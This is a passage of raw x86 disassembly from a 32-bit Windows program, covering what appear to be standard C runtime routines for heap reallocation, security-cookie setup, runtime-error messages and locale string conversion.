  42587c:	mov    esi,DWORD PTR [ebp+0xc]
  42587f:	cmp    esi,ebx
  425881:	jne    0x42588f
  425883:	push   edi
  425884:	call   0x4244ba
  425889:	pop    ecx
  42588a:	jmp    0x4259fe
  42588f:	cmp    DWORD PTR ds:0x45d144,0x3
  425896:	jne    0x4259ca
  42589c:	mov    DWORD PTR [ebp-0x1c],ebx
  42589f:	cmp    esi,0xffffffe0
  4258a2:	ja     0x425999
  4258a8:	push   0x4
  4258aa:	call   0x423a6f
  4258af:	pop    ecx
  4258b0:	mov    DWORD PTR [ebp-0x4],ebx
  4258b3:	push   edi
  4258b4:	call   0x424c92
  4258b9:	pop    ecx
  4258ba:	mov    DWORD PTR [ebp-0x20],eax
  4258bd:	cmp    eax,ebx
  4258bf:	je     0x425969
  4258c5:	cmp    esi,DWORD PTR ds:0x45cf04
  4258cb:	ja     0x425919
  4258cd:	push   esi
  4258ce:	push   edi
  4258cf:	push   eax
  4258d0:	call   0x425192
  4258d5:	add    esp,0xc
  4258d8:	test   eax,eax
  4258da:	je     0x4258e1
  4258dc:	mov    DWORD PTR [ebp-0x1c],edi
  4258df:	jmp    0x425919
  4258e1:	push   esi
  4258e2:	call   0x425471
  4258e7:	pop    ecx
  4258e8:	mov    DWORD PTR [ebp-0x1c],eax
  4258eb:	cmp    eax,ebx
  4258ed:	je     0x425919
  4258ef:	mov    eax,DWORD PTR [edi-0x4]
  4258f2:	dec    eax
  4258f3:	mov    DWORD PTR [ebp-0x24],eax
  4258f6:	cmp    eax,esi
  4258f8:	jb     0x4258fc
  4258fa:	mov    eax,esi
  4258fc:	push   eax
  4258fd:	push   edi
  4258fe:	push   DWORD PTR [ebp-0x1c]
  425901:	call   0x4245f0
  425906:	push   edi
  425907:	call   0x424c92
  42590c:	mov    DWORD PTR [ebp-0x20],eax
  42590f:	push   edi
  425910:	push   eax
  425911:	call   0x424cbd
  425916:	add    esp,0x18
  425919:	cmp    DWORD PTR [ebp-0x1c],ebx
  42591c:	jne    0x425969
  42591e:	cmp    esi,ebx
  425920:	jne    0x425928
  425922:	xor    esi,esi
  425924:	inc    esi
  425925:	mov    DWORD PTR [ebp+0xc],esi
  425928:	add    esi,0xf
  42592b:	and    esi,0xfffffff0
  42592e:	mov    DWORD PTR [ebp+0xc],esi
  425931:	push   esi
  425932:	push   ebx
  425933:	push   DWORD PTR ds:0x45d140
  425939:	call   DWORD PTR ds:0x4280a8
  42593f:	mov    DWORD PTR [ebp-0x1c],eax
  425942:	cmp    eax,ebx
  425944:	je     0x425969
  425946:	mov    eax,DWORD PTR [edi-0x4]
  425949:	dec    eax
  42594a:	mov    DWORD PTR [ebp-0x24],eax
  42594d:	cmp    eax,esi
  42594f:	jb     0x425953
  425951:	mov    eax,esi
  425953:	push   eax
  425954:	push   edi
  425955:	push   DWORD PTR [ebp-0x1c]
  425958:	call   0x4245f0
  42595d:	push   edi
  42595e:	push   DWORD PTR [ebp-0x20]
  425961:	call   0x424cbd
  425966:	add    esp,0x14
  425969:	or     DWORD PTR [ebp-0x4],0xffffffff
  42596d:	call   0x4259c1
  425972:	cmp    DWORD PTR [ebp-0x20],ebx
  425975:	jne    0x425999
  425977:	cmp    esi,ebx
  425979:	jne    0x42597e
  42597b:	xor    esi,esi
  42597d:	inc    esi
  42597e:	add    esi,0xf
  425981:	and    esi,0xfffffff0
  425984:	mov    DWORD PTR [ebp+0xc],esi
  425987:	push   esi
  425988:	push   edi
  425989:	push   ebx
  42598a:	push   DWORD PTR ds:0x45d140
  425990:	call   DWORD PTR ds:0x4280b4
  425996:	mov    DWORD PTR [ebp-0x1c],eax
  425999:	mov    eax,DWORD PTR [ebp-0x1c]
  42599c:	cmp    eax,ebx
  42599e:	jne    0x425a00
  4259a0:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a6:	je     0x425a00
  4259a8:	push   esi
  4259a9:	call   0x426192
  4259ae:	pop    ecx
  4259af:	test   eax,eax
  4259b1:	jne    0x42589c
  4259b7:	jmp    0x4259fe
  4259b9:	xor    ebx,ebx
  4259bb:	mov    esi,DWORD PTR [ebp+0xc]
  4259be:	mov    edi,DWORD PTR [ebp+0x8]
  4259c1:	push   0x4
  4259c3:	call   0x4239db
  4259c8:	pop    ecx
  4259c9:	ret    
  4259ca:	xor    eax,eax
  4259cc:	cmp    esi,0xffffffe0
  4259cf:	ja     0x4259e7
  4259d1:	cmp    esi,ebx
  4259d3:	jne    0x4259d8
  4259d5:	xor    esi,esi
  4259d7:	inc    esi
  4259d8:	push   esi
  4259d9:	push   edi
  4259da:	push   ebx
  4259db:	push   DWORD PTR ds:0x45d140
  4259e1:	call   DWORD PTR ds:0x4280b4
  4259e7:	cmp    eax,ebx
  4259e9:	jne    0x425a00
  4259eb:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259f1:	je     0x425a00
  4259f3:	push   esi
  4259f4:	call   0x426192
  4259f9:	pop    ecx
  4259fa:	test   eax,eax
  4259fc:	jne    0x4259ca
  4259fe:	xor    eax,eax
  425a00:	call   0x4238e3
  425a05:	ret    
  425a06:	push   0x10
  425a08:	push   0x428780
  425a0d:	call   0x4238a8
  425a12:	cmp    DWORD PTR ds:0x45d144,0x3
  425a19:	jne    0x425a55
  425a1b:	push   0x4
  425a1d:	call   0x423a6f
  425a22:	pop    ecx
  425a23:	and    DWORD PTR [ebp-0x4],0x0
  425a27:	mov    esi,DWORD PTR [ebp+0x8]
  425a2a:	push   esi
  425a2b:	call   0x424c92
  425a30:	pop    ecx
  425a31:	mov    DWORD PTR [ebp-0x1c],eax
  425a34:	test   eax,eax
  425a36:	je     0x425a43
  425a38:	mov    esi,DWORD PTR [esi-0x4]
  425a3b:	sub    esi,0x9
  425a3e:	mov    DWORD PTR [ebp-0x20],esi
  425a41:	jmp    0x425a46
  425a43:	mov    esi,DWORD PTR [ebp-0x20]
  425a46:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a4a:	call   0x425a73
  425a4f:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a53:	jne    0x425a68
  425a55:	push   DWORD PTR [ebp+0x8]
  425a58:	push   0x0
  425a5a:	push   DWORD PTR ds:0x45d140
  425a60:	call   DWORD PTR ds:0x4280b8
  425a66:	mov    esi,eax
  425a68:	mov    eax,esi
  425a6a:	call   0x4238e3
  425a6f:	ret    
  425a70:	mov    esi,DWORD PTR [ebp-0x20]
  425a73:	push   0x4
  425a75:	call   0x4239db
  425a7a:	pop    ecx
  425a7b:	ret    
  425a7c:	push   ebp
  425a7d:	mov    ebp,esp
  425a7f:	sub    esp,0x10
  425a82:	push   esi
  425a83:	lea    eax,[ebp-0x8]
  425a86:	push   eax
  425a87:	call   DWORD PTR ds:0x4280c8
  425a8d:	mov    esi,DWORD PTR [ebp-0x4]
  425a90:	xor    esi,DWORD PTR [ebp-0x8]
  425a93:	call   DWORD PTR ds:0x4280c4
  425a99:	xor    esi,eax
  425a9b:	call   DWORD PTR ds:0x428070
  425aa1:	xor    esi,eax
  425aa3:	call   DWORD PTR ds:0x4280c0
  425aa9:	xor    esi,eax
  425aab:	lea    eax,[ebp-0x10]
  425aae:	push   eax
  425aaf:	call   DWORD PTR ds:0x4280bc
  425ab5:	mov    eax,DWORD PTR [ebp-0xc]
  425ab8:	xor    eax,DWORD PTR [ebp-0x10]
  425abb:	xor    esi,eax
  425abd:	mov    DWORD PTR ds:0x45c430,esi
  425ac3:	jne    0x425acf
  425ac5:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425acf:	pop    esi
  425ad0:	leave  
  425ad1:	ret    
  425ad2:	push   0x118
  425ad7:	push   0x428930
  425adc:	call   0x4238a8
  425ae1:	mov    eax,ds:0x45c430
  425ae6:	xor    eax,DWORD PTR [ebp+0x4]
  425ae9:	mov    DWORD PTR [ebp-0x1c],eax
  425aec:	mov    eax,ds:0x45cd98
  425af1:	xor    ecx,ecx
  425af3:	cmp    eax,ecx
  425af5:	je     0x425b16
  425af7:	mov    DWORD PTR [ebp-0x4],ecx
  425afa:	push   DWORD PTR [ebp+0xc]
  425afd:	push   DWORD PTR [ebp+0x8]
  425b00:	call   eax
  425b02:	pop    ecx
  425b03:	pop    ecx
  425b04:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b08:	jmp    0x425c14
  425b0d:	xor    eax,eax
  425b0f:	inc    eax
  425b10:	ret    
  425b11:	mov    esp,DWORD PTR [ebp-0x18]
  425b14:	jmp    0x425b04
  425b16:	mov    eax,DWORD PTR [ebp+0x8]
  425b19:	dec    eax
  425b1a:	je     0x425b2f
  425b1c:	mov    edi,0x42890c
  425b21:	mov    DWORD PTR [ebp-0x20],0x428858
  425b28:	mov    esi,0xd4
  425b2d:	jmp    0x425b40
  425b2f:	mov    edi,0x428838
  425b34:	mov    DWORD PTR [ebp-0x20],0x428798
  425b3b:	mov    esi,0xb9
  425b40:	mov    BYTE PTR [ebp-0x24],cl
  425b43:	push   0x104
  425b48:	lea    eax,[ebp-0x128]
  425b4e:	push   eax
  425b4f:	push   ecx
  425b50:	call   DWORD PTR ds:0x428040
  425b56:	test   eax,eax
  425b58:	jne    0x425b6d
  425b5a:	push   0x42848c
  425b5f:	lea    eax,[ebp-0x128]
  425b65:	push   eax
  425b66:	call   0x423c90
  425b6b:	pop    ecx
  425b6c:	pop    ecx
  425b6d:	lea    ebx,[ebp-0x128]
  425b73:	lea    eax,[ebp-0x128]
  425b79:	push   eax
  425b7a:	call   0x423ec0
  425b7f:	pop    ecx
  425b80:	add    eax,0xb
  425b83:	cmp    eax,0x3c
  425b86:	jbe    0x425bb1
  425b88:	lea    eax,[ebp-0x128]
  425b8e:	push   eax
  425b8f:	call   0x423ec0
  425b94:	mov    ebx,eax
  425b96:	lea    eax,[ebp-0x128]
  425b9c:	sub    eax,0x31
  425b9f:	add    ebx,eax
  425ba1:	push   0x3
  425ba3:	push   0x428488
  425ba8:	push   ebx
  425ba9:	call   0x423d90
  425bae:	add    esp,0x10
  425bb1:	push   ebx
  425bb2:	call   0x423ec0
  425bb7:	pop    ecx
  425bb8:	lea    eax,[eax+esi*1+0xc]
  425bbc:	add    eax,0x3
  425bbf:	and    eax,0xfffffffc
  425bc2:	call   0x423900
  425bc7:	mov    DWORD PTR [ebp-0x18],esp
  425bca:	mov    esi,esp
  425bcc:	push   edi
  425bcd:	push   esi
  425bce:	call   0x423c90
  425bd3:	mov    edi,0x428468
  425bd8:	push   edi
  425bd9:	push   esi
  425bda:	call   0x423ca0
  425bdf:	push   0x42878c
  425be4:	push   esi
  425be5:	call   0x423ca0
  425bea:	push   ebx
  425beb:	push   esi
  425bec:	call   0x423ca0
  425bf1:	push   edi
  425bf2:	push   esi
  425bf3:	call   0x423ca0
  425bf8:	push   DWORD PTR [ebp-0x20]
  425bfb:	push   esi
  425bfc:	call   0x423ca0
  425c01:	push   0x12010
  425c06:	push   0x428440
  425c0b:	push   esi
  425c0c:	call   0x423b92
  425c11:	add    esp,0x3c
  425c14:	push   0x3
  425c16:	call   0x422d16
  425c1b:	int3   
  425c1c:	push   0x38
  425c1e:	push   0x428d50
  425c23:	call   0x4238a8
  425c28:	xor    ebx,ebx
  425c2a:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425c30:	jne    0x425c6a
  425c32:	push   ebx
  425c33:	push   ebx
  425c34:	xor    esi,esi
  425c36:	inc    esi
  425c37:	push   esi
  425c38:	push   0x428d4c
  425c3d:	push   0x100
  425c42:	push   ebx
  425c43:	call   DWORD PTR ds:0x4280d4
  425c49:	test   eax,eax
  425c4b:	je     0x425c55
  425c4d:	mov    DWORD PTR ds:0x45cdbc,esi
  425c53:	jmp    0x425c6a
  425c55:	call   DWORD PTR ds:0x428014
  425c5b:	cmp    eax,0x78
  425c5e:	jne    0x425c6a
  425c60:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c6a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c6d:	jle    0x425c8a
  425c6f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c72:	mov    eax,DWORD PTR [ebp+0x10]
  425c75:	dec    ecx
  425c76:	cmp    BYTE PTR [eax],bl
  425c78:	je     0x425c82
  425c7a:	inc    eax
  425c7b:	cmp    ecx,ebx
  425c7d:	jne    0x425c75
  425c7f:	or     ecx,0xffffffff
  425c82:	or     eax,0xffffffff
  425c85:	sub    eax,ecx
  425c87:	add    DWORD PTR [ebp+0x14],eax
  425c8a:	mov    eax,ds:0x45cdbc
  425c8f:	cmp    eax,0x2
  425c92:	je     0x425e74
  425c98:	cmp    eax,ebx
  425c9a:	je     0x425e74
  425ca0:	cmp    eax,0x1
  425ca3:	jne    0x425ea7
  425ca9:	xor    edi,edi
  425cab:	mov    DWORD PTR [ebp-0x1c],edi
  425cae:	mov    DWORD PTR [ebp-0x20],ebx
  425cb1:	mov    DWORD PTR [ebp-0x24],ebx
  425cb4:	cmp    DWORD PTR [ebp+0x20],ebx
  425cb7:	jne    0x425cc1
  425cb9:	mov    eax,ds:0x45cdb4
  425cbe:	mov    DWORD PTR [ebp+0x20],eax
  425cc1:	push   ebx
  425cc2:	push   ebx
  425cc3:	push   DWORD PTR [ebp+0x14]
  425cc6:	push   DWORD PTR [ebp+0x10]
  425cc9:	xor    eax,eax
  425ccb:	cmp    DWORD PTR [ebp+0x24],ebx
  425cce:	setne  al
  425cd1:	lea    eax,[eax*8+0x1]
  425cd8:	push   eax
  425cd9:	push   DWORD PTR [ebp+0x20]
  425cdc:	call   DWORD PTR ds:0x4280d0
  425ce2:	mov    esi,eax
  425ce4:	mov    DWORD PTR [ebp-0x28],esi
  425ce7:	cmp    esi,ebx
  425ce9:	je     0x425ea7
  425cef:	mov    DWORD PTR [ebp-0x4],0x1
  425cf6:	lea    eax,[esi+esi*1]
  425cf9:	add    eax,0x3
  425cfc:	and    eax,0xfffffffc
  425cff:	call   0x423900
  425d04:	mov    DWORD PTR [ebp-0x18],esp
  425d07:	mov    eax,esp
  425d09:	mov    DWORD PTR [ebp-0x2c],eax
  425d0c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d10:	jmp    0x425d2d
  425d12:	xor    eax,eax
  425d14:	inc    eax
  425d15:	ret    
  425d16:	mov    esp,DWORD PTR [ebp-0x18]
  425d19:	call   0x426d45
  425d1e:	xor    ebx,ebx
  425d20:	mov    DWORD PTR [ebp-0x2c],ebx
  425d23:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d27:	mov    edi,DWORD PTR [ebp-0x1c]
  425d2a:	mov    esi,DWORD PTR [ebp-0x28]
  425d2d:	cmp    DWORD PTR [ebp-0x2c],ebx
  425d30:	jne    0x425d4e
  425d32:	lea    eax,[esi+esi*1]
  425d35:	push   eax
  425d36:	call   0x4245d2
  425d3b:	pop    ecx
  425d3c:	mov    DWORD PTR [ebp-0x2c],eax
  425d3f:	cmp    eax,ebx
  425d41:	je     0x425ea7
  425d47:	mov    DWORD PTR [ebp-0x20],0x1
  425d4e:	push   esi
  425d4f:	push   DWORD PTR [ebp-0x2c]
  425d52:	push   DWORD PTR [ebp+0x14]
  425d55:	push   DWORD PTR [ebp+0x10]
  425d58:	push   0x1
  425d5a:	push   DWORD PTR [ebp+0x20]
  425d5d:	call   DWORD PTR ds:0x4280d0
  425d63:	test   eax,eax
  425d65:	je     0x425e51
  425d6b:	push   ebx
  425d6c:	push   ebx
  425d6d:	push   esi
  425d6e:	push   DWORD PTR [ebp-0x2c]
  425d71:	push   DWORD PTR [ebp+0xc]
  425d74:	push   DWORD PTR [ebp+0x8]
  425d77:	call   DWORD PTR ds:0x4280d4
  425d7d:	mov    edi,eax
  425d7f:	mov    DWORD PTR [ebp-0x1c],edi
  425d82:	cmp    edi,ebx
  425d84:	je     0x425e51
  425d8a:	test   BYTE PTR [ebp+0xd],0x4
  425d8e:	je     0x425dbd
  425d90:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d93:	je     0x425e51
  425d99:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d9c:	jg     0x425e51
  425da2:	push   DWORD PTR [ebp+0x1c]
  425da5:	push   DWORD PTR [ebp+0x18]
  425da8:	push   esi
  425da9:	push   DWORD PTR [ebp-0x2c]
  425dac:	push   DWORD PTR [ebp+0xc]
  425daf:	push   DWORD PTR [ebp+0x8]
  425db2:	call   DWORD PTR ds:0x4280d4
  425db8:	jmp    0x425e51
  425dbd:	mov    DWORD PTR [ebp-0x4],0x2
  425dc4:	lea    eax,[edi+edi*1]
  425dc7:	add    eax,0x3
  425dca:	and    eax,0xfffffffc
  425dcd:	call   0x423900
  425dd2:	mov    DWORD PTR [ebp-0x18],esp
  425dd5:	mov    eax,esp
  425dd7:	mov    DWORD PTR [ebp-0x30],eax
  425dda:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dde:	jmp    0x425dfb
  425de0:	xor    eax,eax
  425de2:	inc    eax
  425de3:	ret    
  425de4:	mov    esp,DWORD PTR [ebp-0x18]
  425de7:	call   0x426d45
  425dec:	xor    ebx,ebx
  425dee:	mov    DWORD PTR [ebp-0x30],ebx
  425df1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425df5:	mov    edi,DWORD PTR [ebp-0x1c]
  425df8:	mov    esi,DWORD PTR [ebp-0x28]
  425dfb:	cmp    DWORD PTR [ebp-0x30],ebx
  425dfe:	jne    0x425e18
  425e00:	lea    eax,[edi+edi*1]
  425e03:	push   eax
  425e04:	call   0x4245d2
  425e09:	pop    ecx
  425e0a:	mov    DWORD PTR [ebp-0x30],eax
  425e0d:	cmp    eax,ebx
  425e0f:	je     0x425e51
  425e11:	mov    DWORD PTR [ebp-0x24],0x1
  425e18:	push   edi
  425e19:	push   DWORD PTR [ebp-0x30]
  425e1c:	push   esi
  425e1d:	push   DWORD PTR [ebp-0x2c]
  425e20:	push   DWORD PTR [ebp+0xc]
  425e23:	push   DWORD PTR [ebp+0x8]
  425e26:	call   DWORD PTR ds:0x4280d4
  425e2c:	test   eax,eax
  425e2e:	je     0x425e51
  425e30:	push   ebx
  425e31:	push   ebx
  425e32:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e35:	jne    0x425e3b
  425e37:	push   ebx
  425e38:	push   ebx
  425e39:	jmp    0x425e41
  425e3b:	push   DWORD PTR [ebp+0x1c]
  425e3e:	push   DWORD PTR [ebp+0x18]
  425e41:	push   edi
  425e42:	push   DWORD PTR [ebp-0x30]
  425e45:	push   ebx
  425e46:	push   DWORD PTR [ebp+0x20]
  425e49:	call   DWORD PTR ds:0x428054
  425e4f:	mov    edi,eax
  425e51:	cmp    DWORD PTR [ebp-0x24],ebx
  425e54:	je     0x425e5f
  425e56:	push   DWORD PTR [ebp-0x30]
  425e59:	call   0x4244ba
  425e5e:	pop    ecx
  425e5f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e62:	je     0x425e6d
  425e64:	push   DWORD PTR [ebp-0x2c]
  425e67:	call   0x4244ba
  425e6c:	pop    ecx
  425e6d:	mov    eax,edi
  425e6f:	jmp    0x425fcf
  425e74:	mov    DWORD PTR [ebp-0x34],ebx
  425e77:	xor    edi,edi
  425e79:	mov    DWORD PTR [ebp-0x38],ebx
  425e7c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e7f:	jne    0x425e89
  425e81:	mov    eax,ds:0x45cda4
  425e86:	mov    DWORD PTR [ebp+0x8],eax
  425e89:	cmp    DWORD PTR [ebp+0x20],ebx
  425e8c:	jne    0x425e96
  425e8e:	mov    eax,ds:0x45cdb4
  425e93:	mov    DWORD PTR [ebp+0x20],eax
  425e96:	push   DWORD PTR [ebp+0x8]
  425e99:	call   0x426b2d
  425e9e:	pop    ecx
  425e9f:	mov    DWORD PTR [ebp-0x3c],eax
  425ea2:	cmp    eax,0xffffffff
  425ea5:	jne    0x425eae
  425ea7:	xor    eax,eax
  425ea9:	jmp    0x425fcf
  425eae:	cmp    eax,DWORD PTR [ebp+0x20]
  425eb1:	je     0x425fa5
  425eb7:	push   ebx
  425eb8:	push   ebx
  425eb9:	lea    ecx,[ebp+0x14]
  425ebc:	push   ecx
  425ebd:	push   DWORD PTR [ebp+0x10]
  425ec0:	push   eax
  425ec1:	push   DWORD PTR [ebp+0x20]
  425ec4:	call   0x426b76
  425ec9:	add    esp,0x18
  425ecc:	mov    DWORD PTR [ebp-0x34],eax
  425ecf:	cmp    eax,ebx
  425ed1:	je     0x425ea7
  425ed3:	push   ebx
  425ed4:	push   ebx
  425ed5:	push   DWORD PTR [ebp+0x14]
  425ed8:	push   eax
  425ed9:	push   DWORD PTR [ebp+0xc]
  425edc:	push   DWORD PTR [ebp+0x8]
  425edf:	call   DWORD PTR ds:0x4280cc
  425ee5:	mov    esi,eax
  425ee7:	mov    DWORD PTR [ebp-0x40],esi
  425eea:	cmp    esi,ebx
  425eec:	je     0x425f94
  425ef2:	mov    DWORD PTR [ebp-0x4],ebx
  425ef5:	add    eax,0x3
  425ef8:	and    eax,0xfffffffc
  425efb:	call   0x423900
  425f00:	mov    DWORD PTR [ebp-0x18],esp
  425f03:	mov    edi,esp
  425f05:	mov    DWORD PTR [ebp-0x44],edi
  425f08:	push   esi
  425f09:	push   ebx
  425f0a:	push   edi
  425f0b:	call   0x4261b0
  425f10:	add    esp,0xc
  425f13:	jmp    0x425f25
  425f15:	xor    eax,eax
  425f17:	inc    eax
  425f18:	ret    
  425f19:	mov    esp,DWORD PTR [ebp-0x18]
  425f1c:	call   0x426d45
  425f21:	xor    ebx,ebx
  425f23:	xor    edi,edi
  425f25:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f29:	cmp    edi,ebx
  425f2b:	jne    0x425f50
  425f2d:	push   DWORD PTR [ebp-0x40]
  425f30:	call   0x4245d2
  425f35:	pop    ecx
  425f36:	mov    edi,eax
  425f38:	cmp    edi,ebx
  425f3a:	je     0x425f6d
  425f3c:	push   DWORD PTR [ebp-0x40]
  425f3f:	push   ebx
  425f40:	push   edi
  425f41:	call   0x4261b0
  425f46:	add    esp,0xc
  425f49:	mov    DWORD PTR [ebp-0x38],0x1
  425f50:	push   DWORD PTR [ebp-0x40]
  425f53:	push   edi
  425f54:	push   DWORD PTR [ebp+0x14]
  425f57:	push   DWORD PTR [ebp-0x34]
  425f5a:	push   DWORD PTR [ebp+0xc]
  425f5d:	push   DWORD PTR [ebp+0x8]
  425f60:	call   DWORD PTR ds:0x4280cc
  425f66:	mov    DWORD PTR [ebp-0x40],eax
  425f69:	cmp    eax,ebx
  425f6b:	jne    0x425f71
  425f6d:	xor    esi,esi
  425f6f:	jmp    0x425f97
  425f71:	push   DWORD PTR [ebp+0x1c]
  425f74:	push   DWORD PTR [ebp+0x18]
  425f77:	lea    eax,[ebp-0x40]
  425f7a:	push   eax
  425f7b:	push   edi
  425f7c:	push   DWORD PTR [ebp+0x20]
  425f7f:	push   DWORD PTR [ebp-0x3c]
  425f82:	call   0x426b76
  425f87:	add    esp,0x18
  425f8a:	mov    esi,eax
  425f8c:	neg    esi
  425f8e:	sbb    esi,esi
  425f90:	neg    esi
  425f92:	jmp    0x425f97
  425f94:	mov    esi,DWORD PTR [ebp-0x48]
  425f97:	cmp    DWORD PTR [ebp-0x38],ebx
  425f9a:	je     0x425fbf
  425f9c:	push   edi
  425f9d:	call   0x4244ba
  425fa2:	pop    ecx
  425fa3:	jmp    0x425fbf
  425fa5:	push   DWORD PTR [ebp+0x1c]
  425fa8:	push   DWORD PTR [ebp+0x18]
  425fab:	push   DWORD PTR [ebp+0x14]
  425fae:	push   DWORD PTR [ebp+0x10]
  425fb1:	push   DWORD PTR [ebp+0xc]
  425fb4:	push   DWORD PTR [ebp+0x8]
  425fb7:	call   DWORD PTR ds:0x4280cc
  425fbd:	mov    esi,eax
  425fbf:	cmp    DWORD PTR [ebp-0x34],ebx
  425fc2:	je     0x425fcd
  425fc4:	push   DWORD PTR [ebp-0x34]
  425fc7:	call   0x4244ba
  425fcc:	pop    ecx
  425fcd:	mov    eax,esi
  425fcf:	lea    esp,[ebp-0x54]
  425fd2:	call   0x4238e3
  425fd7:	ret    
  425fd8:	push   0x1c
  425fda:	push   0x428d78
  425fdf:	call   0x4238a8
  425fe4:	xor    esi,esi
  425fe6:	cmp    DWORD PTR ds:0x45cdc0,esi
  425fec:	jne    0x426023
  425fee:	lea    eax,[ebp-0x1c]
  425ff1:	push   eax
  425ff2:	xor    edi,edi
  425ff4:	inc    edi
  425ff5:	push   edi
  425ff6:	push   0x428d4c
  425ffb:	push   edi
  425ffc:	call   DWORD PTR ds:0x4280dc
  426002:	test   eax,eax
  426004:	je     0x42600e
  426006:	mov    DWORD PTR ds:0x45cdc0,edi
  42600c:	jmp    0x426023
  42600e:	call   DWORD PTR ds:0x428014
  426014:	cmp    eax,0x78
  426017:	jne    0x426023
  426019:	mov    DWORD PTR ds:0x45cdc0,0x2
  426023:	mov    eax,ds:0x45cdc0
  426028:	cmp    eax,0x2
  42602b:	je     0x42611b
  426031:	cmp    eax,esi
  426033:	je     0x42611b
  426039:	cmp    eax,0x1
  42603c:	jne    0x426141
  426042:	mov    DWORD PTR [ebp-0x20],esi
  426045:	mov    DWORD PTR [ebp-0x24],esi
  426048:	cmp    DWORD PTR [ebp+0x18],esi
  42604b:	jne    0x426055
  42604d:	mov    eax,ds:0x45cdb4
  426052:	mov    DWORD PTR [ebp+0x18],eax
  426055:	push   esi
  426056:	push   esi
  426057:	push   DWORD PTR [ebp+0x10]
  42605a:	push   DWORD PTR [ebp+0xc]
  42605d:	xor    eax,eax
  42605f:	cmp    DWORD PTR [ebp+0x20],esi
  426062:	setne  al
  426065:	lea    eax,[eax*8+0x1]
  42606c:	push   eax
  42606d:	push   DWORD PTR [ebp+0x18]
  426070:	call   DWORD PTR ds:0x4280d0
  426076:	mov    edi,eax
  426078:	mov    DWORD PTR [ebp-0x28],edi
  42607b:	test   edi,edi
  42607d:	je     0x426141
  426083:	and    DWORD PTR [ebp-0x4],0x0
  426087:	lea    ebx,[edi+edi*1]
  42608a:	mov    eax,ebx
  42608c:	add    eax,0x3
  42608f:	and    eax,0xfffffffc
  426092:	call   0x423900
  426097:	mov    DWORD PTR [ebp-0x18],esp
  42609a:	mov    esi,esp
  42609c:	mov    DWORD PTR [ebp-0x2c],esi
  42609f:	push   ebx
  4260a0:	push   0x0
  4260a2:	push   esi
  4260a3:	call   0x4261b0
  4260a8:	add    esp,0xc
  4260ab:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260af:	jmp    0x4260c6
  4260b1:	xor    eax,eax
  4260b3:	inc    eax
  4260b4:	ret    
  4260b5:	mov    esp,DWORD PTR [ebp-0x18]
  4260b8:	call   0x426d45
  4260bd:	xor    esi,esi
  4260bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260c3:	mov    edi,DWORD PTR [ebp-0x28]
  4260c6:	test   esi,esi
  4260c8:	jne    0x4260e1
  4260ca:	push   edi
  4260cb:	push   0x2
  4260cd:	call   0x4249c8
  4260d2:	pop    ecx
  4260d3:	pop    ecx
  4260d4:	mov    esi,eax
  4260d6:	test   esi,esi
  4260d8:	je     0x426141
  4260da:	mov    DWORD PTR [ebp-0x24],0x1
  4260e1:	push   edi
  4260e2:	push   esi
  4260e3:	push   DWORD PTR [ebp+0x10]
  4260e6:	push   DWORD PTR [ebp+0xc]
  4260e9:	push   0x1
  4260eb:	push   DWORD PTR [ebp+0x18]
  4260ee:	call   DWORD PTR ds:0x4280d0
  4260f4:	test   eax,eax
  4260f6:	je     0x426109
  4260f8:	push   DWORD PTR [ebp+0x14]
  4260fb:	push   eax
  4260fc:	push   esi
  4260fd:	push   DWORD PTR [ebp+0x8]
  426100:	call   DWORD PTR ds:0x4280dc
  426106:	mov    DWORD PTR [ebp-0x20],eax
  426109:	cmp    DWORD PTR [ebp-0x24],0x0
  42610d:	je     0x426116
  42610f:	push   esi
  426110:	call   0x4244ba
  426115:	pop    ecx
  426116:	mov    eax,DWORD PTR [ebp-0x20]
  426119:	jmp    0x426189
  42611b:	mov    ebx,DWORD PTR [ebp+0x1c]
  42611e:	cmp    ebx,esi
  426120:	jne    0x426128
  426122:	mov    ebx,DWORD PTR ds:0x45cda4
  426128:	mov    edi,DWORD PTR [ebp+0x18]
  42612b:	test   edi,edi
  42612d:	jne    0x426135
  42612f:	mov    edi,DWORD PTR ds:0x45cdb4
  426135:	push   ebx
  426136:	call   0x426b2d
  42613b:	pop    ecx
  42613c:	cmp    eax,0xffffffff
  42613f:	jne    0x426145
  426141:	xor    eax,eax
  426143:	jmp    0x426189
  426145:	cmp    eax,edi
  426147:	je     0x426167
  426149:	push   0x0
  42614b:	push   0x0
  42614d:	lea    ecx,[ebp+0x10]
  426150:	push   ecx
  426151:	push   DWORD PTR [ebp+0xc]
  426154:	push   eax
  426155:	push   edi
  426156:	call   0x426b76
  42615b:	add    esp,0x18
  42615e:	mov    esi,eax
  426160:	test   esi,esi
  426162:	je     0x426141
  426164:	mov    DWORD PTR [ebp+0xc],esi
  426167:	push   DWORD PTR [ebp+0x14]
  42616a:	push   DWORD PTR [ebp+0x10]
  42616d:	push   DWORD PTR [ebp+0xc]
  426170:	push   DWORD PTR [ebp+0x8]
  426173:	push   ebx
  426174:	call   DWORD PTR ds:0x4280d8
  42617a:	mov    edi,eax
  42617c:	test   esi,esi
  42617e:	je     0x426187
  426180:	push   esi
  426181:	call   0x4244ba
  426186:	pop    ecx
  426187:	mov    eax,edi
  426189:	lea    esp,[ebp-0x38]
  42618c:	call   0x4238e3
  426191:	ret    
  426192:	mov    eax,ds:0x45cdc4
  426197:	test   eax,eax
  426199:	je     0x4261aa
  42619b:	push   DWORD PTR [esp+0x4]
  42619f:	call   eax
  4261a1:	test   eax,eax
  4261a3:	pop    ecx
  4261a4:	je     0x4261aa
  4261a6:	xor    eax,eax
